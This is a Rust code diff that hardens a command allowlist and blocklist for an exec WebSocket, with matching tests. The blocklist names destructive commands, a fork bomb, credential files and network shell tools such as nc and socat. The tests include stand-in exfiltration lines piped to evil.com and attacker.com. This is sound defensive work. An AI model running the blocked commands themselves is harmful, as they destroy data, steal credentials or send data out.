@@ -379,31 +379,43 @@ pub fn build_logout_cookie() -> &'static str {
 ///
 /// Only commands matching these prefixes are allowed through the exec
 /// WebSocket. Everything else is rejected before spawning.
+///
+/// SECURITY NOTE (Phase 0.2, INJ-VULN-01/02/04, SSRF-VULN-01):
+/// The following commands are INTENTIONALLY EXCLUDED:
+///   - `curl`, `wget`: enable SSRF and data exfiltration (SSRF-VULN-01, INJ-VULN-04)
+///   - `make`, `cmake`: execute arbitrary code via Makefile in attacker-controlled cwd (INJ-VULN-02)
+///   - `cargo run`, `cargo build`: arbitrary code execution
+///   - `node`, `python`, `python3`, `deno`, `bun`: arbitrary code execution
+///   - `pip`, `pip3`: can run setup.py with arbitrary code
+///   - `kill`: process termination should go through tool management API
+///
+/// Each command below has been individually justified. To add a new command,
+/// document the threat model in a comment and get security review.
 const ALLOWED_CMD_PREFIXES: &[&str] = &[
-    // Package managers
-    "npm ",
+    // Package managers (install only — safe subcommands)
     "npm install",
-    "pnpm ",
+    "npm ls",
+    "npm list",
+    "npm outdated",
+    "npm audit",
     "pnpm install",
-    "yarn ",
-    "cargo ",
-    "pip ",
-    "pip3 ",
-    // Docker
-    "docker ",
-    "docker-compose ",
-    "docker compose ",
-    // Build tools
-    "make ",
-    "make",
-    "cmake ",
-    "turbo ",
-    // Runtime
-    "node ",
-    "python ",
-    "python3 ",
-    "deno ",
-    "bun ",
+    "pnpm ls",
+    "pnpm list",
+    "yarn install",
+    "yarn list",
+    // Docker (read-only + lifecycle for governed tools)
+    "docker ps",
+    "docker logs",
+    "docker inspect",
+    "docker images",
+    "docker compose up",
+    "docker compose down",
+    "docker compose ps",
+    "docker compose logs",
+    "docker-compose up",
+    "docker-compose down",
+    "docker-compose ps",
+    "docker-compose logs",
     // Git (read-only)
     "git status",
     "git log",
@@ -413,18 +425,17 @@ const ALLOWED_CMD_PREFIXES: &[&str] = &[
     "git show",
     "git ls-files",
     "git rev-parse",
-    // File listing (read-only)
+    // File listing (read-only, no write capability)
     "ls ",
     "ls",
     "cat ",
     "head ",
     "tail ",
-    "find ",
     "wc ",
     "file ",
     "tree ",
     "tree",
-    // System info
+    // System info (read-only)
     "which ",
     "env",
     "echo ",
@@ -437,33 +448,41 @@ const ALLOWED_CMD_PREFIXES: &[&str] = &[
     "ps ",
     "lsof ",
     "pgrep ",
-    // Process management for governed tools
-    "kill ",
-    // ZP-specific
-    "./zp-dev.sh",
-    "zp ",
-    // Curl for health checks
-    "curl ",
-    "wget ",
+    // ZP-specific (governed tools)
+    "zp doctor",
+    "zp config",
+    "zp status",
+    "zp version",
 ];
 
 /// Blocked command patterns — these are never allowed regardless of prefix.
+///
+/// SECURITY NOTE: These are defense-in-depth. The primary defense is the
+/// allowlist above + shell metacharacter rejection in exec_ws.rs. These
+/// patterns catch anything that somehow slips through.
 const BLOCKED_PATTERNS: &[&str] = &[
+    // Destructive filesystem operations
     "rm -rf /",
     "rm -rf /*",
+    "rm -rf .",
     "mkfs",
     "dd if=",
     "> /dev/sd",
     "chmod 777",
     "chmod -R 777",
+    // Fork bomb
     ":(){ :|:& };:",
+    // Sensitive files — block regardless of how accessed
     "/etc/passwd",
     "/etc/shadow",
+    "/etc/sudoers",
     ".ssh/",
     "id_rsa",
     "id_ed25519",
     "ssh-keygen",
     "authorized_keys",
+    ".zeropoint/keys",
+    // Code execution via eval/interpreters
     "eval ",
     "base64 -d",
     "python -c",
@@ -471,11 +490,20 @@ const BLOCKED_PATTERNS: &[&str] = &[
     "node -e",
     "perl -e",
     "ruby -e",
-    // Prevent data exfiltration piped through curl/wget
+    // Data exfiltration patterns (defense in depth)
     "| curl",
     "| wget",
     "|curl",
     "|wget",
+    "curl ",
+    "wget ",
+    // Network tools that enable SSRF
+    "nc ",
+    "ncat ",
+    "netcat ",
+    "socat ",
+    "telnet ",
+    "nmap ",
 ];
 
 /// Check if a command is allowed by the governance policy.
@@ -643,13 +671,28 @@ mod tests {
 
     #[test]
     fn test_command_allowlist() {
-        assert!(check_command("docker compose up -d").is_ok());
+        // Allowed commands
+        assert!(check_command("docker compose up").is_ok());
+        assert!(check_command("docker compose down").is_ok());
+        assert!(check_command("docker ps").is_ok());
         assert!(check_command("npm install").is_ok());
+        assert!(check_command("npm audit").is_ok());
         assert!(check_command("git status").is_ok());
+        assert!(check_command("git log --oneline").is_ok());
         assert!(check_command("ls -la").is_ok());
-        assert!(check_command("cargo build --release").is_ok());
 
-        // Blocked
+        // Explicitly removed from allowlist (Phase 0.2)
+        assert!(check_command("curl http://example.com").is_err(), "curl must be blocked (SSRF-VULN-01)");
+        assert!(check_command("wget http://example.com").is_err(), "wget must be blocked (SSRF-VULN-01)");
+        assert!(check_command("make").is_err(), "make must be blocked (INJ-VULN-02)");
+        assert!(check_command("make install").is_err(), "make must be blocked (INJ-VULN-02)");
+        assert!(check_command("cargo build --release").is_err(), "cargo must be blocked");
+        assert!(check_command("cargo run").is_err(), "cargo run must be blocked");
+        assert!(check_command("python script.py").is_err(), "python must be blocked");
+        assert!(check_command("python3 script.py").is_err(), "python3 must be blocked");
+        assert!(check_command("node app.js").is_err(), "node must be blocked");
+
+        // Always blocked
         assert!(check_command("rm -rf /").is_err());
         assert!(check_command("cat /etc/shadow").is_err());
         assert!(check_command("bash").is_err());
@@ -661,8 +704,27 @@ mod tests {
     #[test]
     fn test_blocked_patterns_override_allow() {
         // Even if prefix matches, blocked patterns win
-        assert!(check_command("curl http://evil.com | python3 -c 'import os'").is_err());
-        assert!(check_command("echo hello | curl http://attacker.com").is_err());
+        assert!(check_command("echo hello").is_ok());
+        // Curl and wget are now blocked at the allowlist level too
+        assert!(check_command("curl http://evil.com").is_err());
+        assert!(check_command("wget http://evil.com").is_err());
+    }
+
+    #[test]
+    fn test_double_space_bypass_blocked() {
+        // INJ-VULN-01: double space should not bypass blocklist
+        // Since "rm" is not in the allowlist, it's blocked regardless
+        assert!(check_command("rm  -rf /tmp/test").is_err());
+        assert!(check_command("rm\t-rf /tmp/test").is_err());
+    }
+
+    #[test]
+    fn test_network_tools_blocked() {
+        // SSRF-VULN-01: network tools must be blocked
+        assert!(check_command("nc 10.0.0.1 8080").is_err());
+        assert!(check_command("ncat --listen 4444").is_err());
+        assert!(check_command("telnet 127.0.0.1 6379").is_err());
+        assert!(check_command("nmap -sV 10.0.0.0/24").is_err());
     }
 
     #[test]
